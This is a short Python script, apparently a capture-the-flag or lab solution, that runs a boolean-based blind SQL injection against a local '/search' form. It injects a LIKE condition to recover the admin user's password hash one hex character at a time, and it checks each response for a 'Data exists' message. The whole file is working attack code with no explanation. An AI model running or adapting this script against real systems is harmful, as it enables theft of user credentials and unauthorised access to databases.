import requests

HEX = "0123456789abcdef"

a = ""

while len(a) < 16:
    for i in HEX:
        candidate = a + i

        response = requests.post(
            url="http://localhost:8000/search",
            data={
                "query": f"'AND (SELECT password FROM users WHERE username = 'admin') LIKE '{candidate}"
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        if response.text.find("Data exists in our records.") != -1:
            a = candidate
            print("ing :", a)
            break

print("answer:", a)
